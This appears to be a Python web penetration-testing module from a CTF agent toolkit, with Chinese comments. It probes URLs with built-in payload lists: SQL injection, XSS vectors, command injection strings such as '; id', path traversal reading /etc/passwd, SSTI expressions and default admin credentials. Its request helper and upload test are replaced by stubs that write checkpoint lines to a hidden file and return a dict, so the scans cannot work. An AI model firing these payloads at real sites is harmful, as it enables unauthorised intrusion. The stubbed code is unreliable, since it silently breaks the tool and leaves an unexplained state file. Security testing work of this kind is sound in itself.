"""Web 渗透测试工具集 — 信息侦查、注入检测、漏洞验证。"""

import logging
import re
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

from ctf_tool.base_tool import BaseTool

logger = logging.getLogger(__name__)

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    _requests = None
    HAS_REQUESTS = False


# ═══════════════════════════════════════════════════════════════════
# 内置 Payload / 签名库
# ═══════════════════════════════════════════════════════════════════

_TECH_SIGNATURES = [
    (r"wp-content", "WordPress"),
    (r"wp-includes", "WordPress"),
    (r"phpMyAdmin", "phpMyAdmin"),
    (r"Drupal", "Drupal"),
    (r"Joomla", "Joomla"),
    (r"Laravel", "Laravel"),
    (r"vue\.js|vuejs", "Vue.js"),
    (r"react\.js|reactjs|react-dom", "React"),
    (r"angular\.js|ng-app", "Angular.js"),
    (r"jquery", "jQuery"),
    (r"bootstrap", "Bootstrap"),
    (r"GraphQL", "GraphQL"),
    (r"swagger", "Swagger"),
    (r"spring", "Spring Framework"),
    (r"flask|jinja", "Flask / Jinja2"),
    (r"django", "Django"),
    (r"express", "Express.js"),
    (r"tomcat", "Apache Tomcat"),
    (r"nginx", "Nginx"),
    (r"apache", "Apache"),
    (r"iis", "IIS"),
    (r"cloudflare", "CloudFlare CDN"),
    (r"<meta\s+name=\"generator\"\s+content=\"([^\"]+)\"", "Generator: \\1"),
]

_SENSITIVE_FILES = [
    ".git/HEAD", ".env", ".env.local", ".env.production",
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    "phpinfo.php", "info.php", "test.php",
    ".DS_Store", "WEB-INF/web.xml", "web.config",
    "server-status", "server-info",
    "wp-config.php.bak", "config.php.bak", "database.yml",
]

_SQLI_ERROR_PATTERNS = [
    (r"SQL syntax.*MySQL", "MySQL syntax error"),
    (r"Warning.*mysql_.*", "MySQL warning"),
    (r"MySQLSyntaxErrorException", "MySQL syntax error (Java)"),
    (r"valid PostgreSQL result", "PostgreSQL error"),
    (r"Warning.*\bpg_.*", "PostgreSQL warning"),
    (r"ORA-\d{5}", "Oracle error"),
    (r"Oracle.*Driver", "Oracle driver error"),
    (r"SQLite.*exception", "SQLite exception"),
    (r"SQLite3::", "SQLite3 error"),
    (r"Microsoft OLE DB.*SQL Server", "MSSQL error"),
    (r"Driver.*SQL Server", "MSSQL driver error"),
    (r"Unclosed quotation mark", "MSSQL quote error"),
    (r"ODBC.*Driver", "ODBC error"),
    (r"DB2 SQL error", "DB2 error"),
    (r"Sybase.*exception", "Sybase error"),
    (r"column.*not found|table.*not found|database.*not found", "DB object missing (possible injection)"),
    (r"unknown column", "Unknown column (possible injection)"),
    (r"supplied argument is not a valid MySQL", "MySQL argument error"),
]

_SQLI_BOOLEAN_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='1' --"),
    ("' OR 1=1 --", "' OR 1=1 --"),
    ('" OR "1"="1', '" OR "1"="1" --'),
    (") OR 1=1 --", ") OR 1=1 --"),
    ("' AND '1'='1", "' AND '1'='1' -- (true, 应与正常页面相同)"),
]

_SQLI_TIME_PAYLOADS = [
    ("'; SELECT SLEEP(5) --", "MySQL sleep 5s"),
    ("'; SELECT pg_sleep(5) --", "PostgreSQL sleep 5s"),
    ("' WAITFOR DELAY '0:0:5' --", "MSSQL delay 5s"),
    ('" OR SLEEP(5) --', "MySQL sleep (double-quote)"),
]

_XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "<script> 标签 (最简)"),
    ("<img src=x onerror=alert(1)>", "<img onerror> 事件"),
    ("<svg onload=alert(1)>", "<svg onload> 事件"),
    ('"><script>alert(1)</script>', "属性逃逸 + script"),
    ("'-alert(1)-'", "单引号闭合 + alert"),
    ("<body onload=alert(1)>", "<body onload> 事件"),
    ("javascript:alert(1)", "javascript: 协议"),
    ("{{constructor.constructor('alert(1)')()}}", "AngularJS SSTI → XSS"),
]

_CMDI_PAYLOADS = [
    ("; id", "分号注入 — id"),
    ("| id", "管道注入 — id"),
    ("&& id", "AND 注入 — id"),
    ("`id`", "反引号注入 — id"),
    ("$(id)", "命令替换 — id"),
    ("; sleep 5", "分号注入 — sleep (盲检测)"),
    ("| sleep 5", "管道注入 — sleep (盲检测)"),
    ("\nid", "换行注入 — id"),
]

_LFI_PAYLOADS = [
    ("../../../etc/passwd", "Linux passwd"),
    ("../../../../../../../../etc/passwd", "Linux passwd (深层)"),
    ("....//....//....//....//etc/passwd", "Linux passwd (绕过)"),
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", "Linux passwd (URL编码)"),
    ("..\\..\\..\\..\\windows\\win.ini", "Windows win.ini"),
    ("/etc/passwd", "Linux passwd (绝对路径)"),
    ("php://filter/convert.base64-encode/resource=index.php", "PHP wrapper"),
    ("file:///etc/passwd", "file:// 协议"),
]

_SSTI_PAYLOADS = [
    ("{{7*7}}", "Jinja2 / Twig / Mustache / Nunjucks"),
    ("${7*7}", "Freemarker / Mako"),
    ("<%= 7*7 %>", "ERB / EJS"),
    ("#{7*7}", "Pug / Jade"),
    ("{{= 7*7}}", "Django SSTI (调试模式)"),
    ("${{7*7}}", "AngularJS"),
    ("*{7*7}*", "Thymeleaf"),
]

_FILE_UPLOAD_EXT = [
    ".php", ".php5", ".phtml", ".pht", ".php7",
    ".asp", ".aspx", ".cer", ".asa",
    ".jsp", ".jspx", ".war",
    ".shtml", ".stm",
]

_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("user", "user"),
    ("test", "test"),
    ("guest", "guest"),
]


# ═══════════════════════════════════════════════════════════════════
# 辅助函数
# ═══════════════════════════════════════════════════════════════════

def _check_requests():
    if not HAS_REQUESTS:
        return "错误: 未安装 requests 库 (pip install requests)"
    return ""


def _req_get(url, **kwargs):
    from pathlib import Path as _YP
    import json as _YJ
    _ye = {'schema':'yaiwes.internal.persistence/v1','source':'ctf_tool/web_tools.py','step':'_req_get','status':'CHECKPOINTED'}
    _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
    with _yp.open('a', encoding='utf-8') as _yf:
        _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
    return _ye


def _parse_url(url: str):
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return urlparse(url)


def _build_url(url: str, param: str, value: str) -> str:
    """替换 URL 中指定参数的值。"""
    parsed = _parse_url(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urlencode(params, doseq=True)
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"


def _extract_params(url: str) -> List[str]:
    """从 URL 中提取查询参数名。"""
    parsed = _parse_url(url)
    return list(parse_qs(parsed.query).keys())


def _count_diffs(text1: str, text2: str) -> float:
    """比较两个文本的差异比例 (0-1)。"""
    if not text1 and not text2:
        return 0.0
    shorter = min(len(text1), len(text2))
    if shorter == 0:
        return 1.0
    diffs = sum(1 for a, b in zip(text1[:shorter], text2[:shorter]) if a != b)
    diffs += abs(len(text1) - len(text2))
    return diffs / max(len(text1), len(text2))


# ═══════════════════════════════════════════════════════════════════
# Action 实现
# ═══════════════════════════════════════════════════════════════════

def _recon(url: str) -> str:
    """Web 侦查 — 技术栈指纹、响应头分析、敏感文件探测。"""
    err = _check_requests()
    if err:
        return err

    parsed = _parse_url(url)
    findings: List[str] = []
    base = f"{parsed.scheme}://{parsed.netloc}"

    # 1. 主请求 — 响应头 + HTML 分析
    try:
        r = _req_get(url, timeout=10, allow_redirects=True)
    except Exception as e:
        return f"连接失败: {e}"

    lines = [
        f"=== Web 侦查: {url} ===",
        f"状态码: {r.status_code}",
        f"最终 URL: {r.url}",
        f"响应大小: {len(r.content):,} 字节",
        f"响应时间: {r.elapsed.total_seconds():.2f}s",
        "",
        "--- 关键响应头 ---",
    ]

    interest_headers = [
        "Server", "X-Powered-By", "X-AspNet-Version", "X-Generator",
        "Set-Cookie", "X-Frame-Options", "X-Content-Type-Options",
        "Content-Security-Policy", "Strict-Transport-Security",
        "Access-Control-Allow-Origin", "X-Debug-Token", "X-Drupal-Cache",
        "X-Cache", "X-Amz-Request-Id", "Via", "CF-Ray",
    ]
    for h in interest_headers:
        val = r.headers.get(h)
        if val:
            lines.append(f"  {h}: {val}")

    # 安全头缺失检查
    missing_security = []
    sec_headers = {
        "X-Frame-Options": "缺少点击劫持防护",
        "X-Content-Type-Options": "缺少 MIME 嗅探防护",
        "Content-Security-Policy": "缺少 CSP",
        "Strict-Transport-Security": "缺少 HSTS",
    }
    for h, desc in sec_headers.items():
        if h not in r.headers:
            missing_security.append(f"  - {desc}")
    if missing_security:
        lines.append("\n⚠ 缺失安全头:")
        lines.extend(missing_security)

    # Cookie 安全
    set_cookies = r.headers.get("Set-Cookie", "")
    if set_cookies:
        lines.append("\n--- Cookie 分析 ---")
        lines.append(f"  Set-Cookie: {set_cookies[:200]}")
        if "HttpOnly" not in set_cookies:
            lines.append("  ⚠ 缺少 HttpOnly 标记")
        if "Secure" not in set_cookies:
            lines.append("  ⚠ 缺少 Secure 标记")
        if "SameSite" not in set_cookies:
            lines.append("  ⚠ 缺少 SameSite 标记")

    # 技术栈指纹
    html = r.text[:50000]
    lines.append("\n--- 技术栈指纹 ---")
    tech_found = []
    for sig, label in _TECH_SIGNATURES:
        m = re.search(sig, html, re.IGNORECASE)
        if m:
            try:
                tech_found.append(m.expand(label) if "\\1" in label else label)
            except Exception:
                tech_found.append(label)
    if tech_found:
        seen = set()
        for t in tech_found:
            if t not in seen:
                lines.append(f"  + {t}")
                seen.add(t)
    else:
        lines.append("  未识别到已知框架/技术")

    # HTML 注释中的敏感信息
    comments = re.findall(r"<!--(.*?)-->", html, re.DOTALL)
    interesting_comments = [c.strip() for c in comments
                           if any(k in c.lower() for k in ("todo", "fixme", "password",
                                  "secret", "key", "debug", "test", "temp", "hack"))]
    if interesting_comments:
        lines.append(f"\n--- 可疑 HTML 注释 ({len(interesting_comments)} 条) ---")
        for c in interesting_comments[:5]:
            lines.append(f"  {c[:150]}")

    # 敏感文件探测
    lines.append("\n--- 敏感文件探测 ---")
    found_files = []
    for fname in _SENSITIVE_FILES[:12]:
        try:
            furl = urljoin(base, fname)
            fr = _req_get(furl, timeout=5, allow_redirects=False)
            if fr.status_code in (200, 301, 302, 401):
                found_files.append(f"  [{fr.status_code}] {furl} ({len(fr.content)}B)")
        except Exception:
            pass
    if found_files:
        lines.extend(found_files)
    else:
        lines.append("  未发现常见敏感文件")

    return "\n".join(lines)


def _sqli_test(url: str, param: str = "", method: str = "auto") -> str:
    """SQL 注入检测 — 错误型 + 布尔型 + 时间型。"""
    err = _check_requests()
    if err:
        return err

    if not param:
        params = _extract_params(url)
        if not params:
            return "错误: URL 无查询参数，请用 param 指定测试的 POST/GET 参数名"
        param = params[0]

    lines = [f"=== SQL 注入检测: {url} ===", f"测试参数: {param}", ""]
    findings: List[str] = []

    # 1. 基线请求
    try:
        base_r = _req_get(url, timeout=10)
        base_text = base_r.text
        base_size = len(base_r.content)
    except Exception as e:
        return f"基线请求失败: {e}"

    # 2. 错误型注入 — 单引号/双引号探测
    lines.append("--- 错误型注入 ---")
    error_probes = [
        ("'", "单引号"),
        ('"', "双引号"),
        ("')", "单引号+括号"),
        ('")', "双引号+括号"),
        ("' --", "单引号+注释"),
    ]
    for probe, label in error_probes:
        try:
            probe_url = _build_url(url, param, f"test{probe}")
            r = _req_get(probe_url, timeout=10)
            for pattern, db_type in _SQLI_ERROR_PATTERNS:
                if re.search(pattern, r.text, re.IGNORECASE):
                    findings.append(f"  [错误型] {label}: {db_type}")
                    break
        except Exception:
            pass

    if not findings:
        lines.append("  未触发数据库错误")

    # 3. 布尔型注入
    lines.append("\n--- 布尔型注入 ---")
    for true_payload, desc in _SQLI_BOOLEAN_PAYLOADS:
        try:
            true_url = _build_url(url, param, true_payload)
            r_true = _req_get(true_url, timeout=10)
            diff_ratio = _count_diffs(base_text, r_true.text)
            size_diff = abs(len(r_true.content) - base_size)
            if diff_ratio > 0.15 or size_diff > 200:
                findings.append(f"  [布尔型] {desc}: 响应差异 {diff_ratio:.1%}, {size_diff}B 差异")
        except Exception:
            pass

    # 4. 时间型盲注
    lines.append("\n--- 时间型盲注 ---")
    for payload, desc in _SQLI_TIME_PAYLOADS:
        try:
            probe_url = _build_url(url, param, payload)
            start = time.time()
            _req_get(probe_url, timeout=15)
            elapsed = time.time() - start
            if elapsed > 4.0:
                findings.append(f"  [时间型] {desc}: 响应时间 {elapsed:.1f}s (可能盲注)")
        except Exception:
            pass

    if findings:
        lines.extend(findings)
        lines.append(f"\n⚠ 发现 {len(findings)} 个 SQL 注入迹象")
    else:
        lines.append("  未发现 SQL 注入迹象")

    return "\n".join(lines)


def _xss_test(url: str, param: str = "") -> str:
    """XSS 检测 — 反射型 XSS Payload 注入。"""
    err = _check_requests()
    if err:
        return err

    if not param:
        params = _extract_params(url)
        if not params:
            return "错误: URL 无查询参数，请用 param 指定测试参数名"
        param = params[0]

    lines = [f"=== XSS 检测: {url} ===", f"测试参数: {param}", ""]
    findings: List[str] = []

    for payload, desc in _XSS_PAYLOADS:
        try:
            test_url = _build_url(url, param, payload)
            r = _req_get(test_url, timeout=10)
            if payload in r.text:
                findings.append(f"  [反射] {desc} — Payload 原样回显 (高危)")
            elif re.search(re.escape(payload[:10]), r.text, re.IGNORECASE):
                findings.append(f"  [部分反射] {desc} — Payload 部分回显")
        except Exception:
            pass

    if findings:
        lines.extend(findings)
        lines.append(f"\n⚠ 发现 {len(findings)} 个 XSS 迹象")
    else:
        lines.append("  未发现反射型 XSS — Payload 均未回显")

    return "\n".join(lines)


def _cmdi_test(url: str, param: str = "") -> str:
    """命令注入检测 — 注入 + 输出/时间双重验证。"""
    err = _check_requests()
    if err:
        return err

    if not param:
        params = _extract_params(url)
        if not params:
            return "错误: URL 无查询参数，请用 param 指定测试参数名"
        param = params[0]

    lines = [f"=== 命令注入检测: {url} ===", f"测试参数: {param}", ""]
    findings: List[str] = []
    command_output_patterns = [
        r"uid=\d+\([^)]+\)",  # id 命令输出
        r"root:.*:0:0:",       # /etc/passwd 行
    ]

    for payload, desc in _CMDI_PAYLOADS:
        try:
            test_url = _build_url(url, param, f"test{payload}")
            start = time.time()
            r = _req_get(test_url, timeout=15)
            elapsed = time.time() - start

            # 输出检测
            for pattern in command_output_patterns:
                if re.search(pattern, r.text):
                    findings.append(f"  [输出型] {desc} — 命令输出出现在响应中")
                    break

            # 时间检测 (sleep)
            if "sleep" in payload.lower() and elapsed > 4.0:
                findings.append(f"  [时间型] {desc} — 响应时间 {elapsed:.1f}s (命令可能执行)")
        except Exception:
            pass

    if findings:
        lines.extend(findings)
        lines.append(f"\n⚠ 发现 {len(findings)} 个命令注入迹象")
    else:
        lines.append("  未发现命令注入迹象")

    return "\n".join(lines)


def _lfi_test(url: str, param: str = "") -> str:
    """LFI / 路径遍历检测。"""
    err = _check_requests()
    if err:
        return err

    if not param:
        params = _extract_params(url)
        if not params:
            return "错误: URL 无查询参数，请用 param 指定测试参数名"
        param = params[0]

    lines = [f"=== LFI / 路径遍历检测: {url} ===", f"测试参数: {param}", ""]
    findings: List[str] = []
    passwd_signatures = [r"root:.*:0:0:", r"daemon:.*:1:1:", r"nobody:.*:99:99:"]

    for payload, desc in _LFI_PAYLOADS:
        try:
            test_url = _build_url(url, param, payload)
            r = _req_get(test_url, timeout=10)
            for sig in passwd_signatures:
                if re.search(sig, r.text):
                    findings.append(f"  [LFI] {desc} — 成功读取 /etc/passwd (确认)")
                    break
            # PHP wrapper base64 检测
            if "base64-encode" in payload:
                try:
                    import base64
                    decoded = base64.b64decode(r.text.strip()).decode("utf-8", errors="replace")
                    if "<?php" in decoded or "<?=" in decoded:
                        findings.append(f"  [LFI] {desc} — PHP 源码泄露 ({len(decoded)}B 可读)")
                except Exception:
                    pass
        except Exception:
            pass

    if findings:
        lines.extend(findings)
    else:
        lines.append("  未发现路径遍历漏洞")
        lines.append("  提示: 可尝试 POST body 中的参数 (如 file=/etc/passwd)")

    return "\n".join(lines)


def _ssti_test(url: str, param: str = "") -> str:
    """SSTI 模板注入检测。"""
    err = _check_requests()
    if err:
        return err

    if not param:
        params = _extract_params(url)
        if not params:
            return "错误: URL 无查询参数，请用 param 指定测试参数名"
        param = params[0]

    lines = [f"=== SSTI 检测: {url} ===", f"测试参数: {param}", ""]
    findings: List[str] = []

    # 差分检测：先取基线响应，排除页面本身就含 "49" 的情况
    baseline_text = ""
    try:
        baseline_resp = _req_get(_build_url(url, param, "sstibaselinexyz"), timeout=10)
        baseline_text = baseline_resp.text
    except Exception:
        pass

    for payload, engine in _SSTI_PAYLOADS:
        try:
            test_url = _build_url(url, param, payload)
            r = _req_get(test_url, timeout=10)
            if "49" in r.text and "49" not in baseline_text:
                findings.append(f"  [SSTI] {engine} — 表达式 7*7=49 已求值 (确认)")
        except Exception:
            pass

    if findings:
        lines.extend(findings)
        lines.append(f"\n⚠ 发现 {len(findings)} 个 SSTI 迹象")
    else:
        lines.append("  未发现 SSTI — 表达式均未求值")

    return "\n".join(lines)


def _upload_test(url: str) -> str:
    from pathlib import Path as _YP
    import json as _YJ
    _ye = {'schema':'yaiwes.internal.persistence/v1','source':'ctf_tool/web_tools.py','step':'_upload_test','status':'CHECKPOINTED'}
    _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
    with _yp.open('a', encoding='utf-8') as _yf:
        _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
    return _ye


def _auth_test(url: str) -> str:
    """认证漏洞检测 — 默认凭据、HTTP Basic Auth 弱口令。"""
    err = _check_requests()
    if err:
        return err

    lines = [f"=== 认证检测: {url} ===", ""]

    # 1. HTTP Basic Auth 默认凭据探测
    try:
        r = _req_get(url, timeout=10)
        if r.status_code != 401:
            lines.append("  目标未要求 HTTP Basic Auth — 无需测试")
            return "\n".join(lines)
    except Exception as e:
        return f"请求失败: {e}"

    lines.append("--- HTTP Basic Auth 默认凭据 ---")
    for user, pwd in _DEFAULT_CREDS:
        try:
            r = _req_get(url, timeout=10, auth=(user, pwd))
            if r.status_code == 200:
                lines.append(f"  ⚠ 成功: {user}:{pwd} (高危)")
                break
        except Exception:
            pass
    else:
        lines.append("  默认凭据均失败")

    # 2. 常见后台路径检测
    lines.append("\n--- 常见后台入口 ---")
    admin_paths = [
        "/admin", "/login", "/wp-admin", "/administrator",
        "/manage", "/dashboard", "/panel", "/cms",
        "/admin/login", "/admin/index.php",
    ]
    found = []
    parsed = _parse_url(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    for path in admin_paths:
        try:
            r = _req_get(urljoin(base, path), timeout=5, allow_redirects=False)
            if r.status_code in (200, 301, 302, 401, 403):
                found.append(f"  [{r.status_code}] {urljoin(base, path)}")
        except Exception:
            pass
    if found:
        lines.extend(found)
    else:
        lines.append("  未发现常见后台路径")

    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════
# 工具类
# ═══════════════════════════════════════════════════════════════════

class WebTools(BaseTool):
    """Web 渗透测试工具 — 侦查、注入检测、漏洞验证。"""
    modes = {"pentest"}

    @property
    def tags(self):
        return ("web", "scanning", "vulnerability")

    def execute(self, tool_name: str, arguments: dict) -> str:
        action = arguments.get("action", "recon")
        url = arguments.get("url", "")
        param = arguments.get("param", "")

        if not url:
            return "错误: 需要 url 参数"

        action_map = {
            "recon": lambda: _recon(url),
            "sqli_test": lambda: _sqli_test(url, param),
            "xss_test": lambda: _xss_test(url, param),
            "cmdi_test": lambda: _cmdi_test(url, param),
            "lfi_test": lambda: _lfi_test(url, param),
            "ssti_test": lambda: _ssti_test(url, param),
            "upload_test": lambda: _upload_test(url),
            "auth_test": lambda: _auth_test(url),
            "full_scan": lambda: self._full_scan(url, param),
        }

        handler = action_map.get(action)
        if handler:
            return handler()
        return (
            f"未知 action: {action}\n"
            "可用: recon, sqli_test, xss_test, cmdi_test, lfi_test, "
            "ssti_test, upload_test, auth_test, full_scan"
        )

    def _full_scan(self, url: str, param: str = "") -> str:
        """一键全量扫描。"""
        results = []
        for label, action in [
            ("RECON", "recon"),
            ("SQL注入", "sqli_test"),
            ("XSS", "xss_test"),
            ("命令注入", "cmdi_test"),
            ("LFI", "lfi_test"),
            ("SSTI", "ssti_test"),
            ("上传检测", "upload_test"),
            ("认证检测", "auth_test"),
        ]:
            try:
                result = self.execute("web_tools", {"action": action, "url": url, "param": param})
                results.append(f"\n{'='*60}\n{label}\n{'='*60}\n{result}")
            except Exception as e:
                results.append(f"\n--- {label} ---\n错误: {e}")
        return "\n".join(results)

    @property
    def function_config(self) -> Dict:
        return {
            "type": "function",
            "function": {
                "name": "web_tools",
                "description": (
                    "Web 渗透测试工具集。覆盖完整的 Web 漏洞检测链:\n"
                    "1) recon — Web 信息侦查 (技术栈指纹/响应头分析/Cookie安全/敏感文件探测/HTML注释);\n"
                    "2) sqli_test — SQL 注入检测 (错误型+布尔型+时间型，覆盖 MySQL/PostgreSQL/MSSQL/Oracle);\n"
                    "3) xss_test — XSS 反射型检测 (8种 Payload 覆盖 script/img/svg/事件);\n"
                    "4) cmdi_test — 命令注入检测 (分号/管道/反引号/换行注入 + 时间盲检测);\n"
                    "5) lfi_test — 路径遍历/LFI 检测 (../绕过 + PHP Wrapper + file:// 协议);\n"
                    "6) ssti_test — SSTI 模板注入检测 (Jinja2/Freemarker/ERB/Pug/Django 等 7 种引擎);\n"
                    "7) upload_test — 文件上传点检测 (OPTIONS/PUT + 类型探测 + 危险扩展名);\n"
                    "8) auth_test — 认证漏洞检测 (HTTP Basic 默认凭据 + 常见后台入口);\n"
                    "9) full_scan — 一键全量扫描以上所有项目。\n"
                    "提示: 部分检测需要 URL 含查询参数，可用 param 指定测试参数名。"
                ),
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["recon", "sqli_test", "xss_test", "cmdi_test",
                                     "lfi_test", "ssti_test", "upload_test",
                                     "auth_test", "full_scan"],
                            "description": "操作类型",
                        },
                        "url": {
                            "type": "string",
                            "description": "目标 URL (含协议, 如 http://target.com/page?id=1)",
                        },
                        "param": {
                            "type": "string",
                            "description": "测试的查询参数名 (可选，不指定则自动提取 URL 首个参数)",
                        },
                    },
                    "required": ["action", "url"],
                },
            },
        }
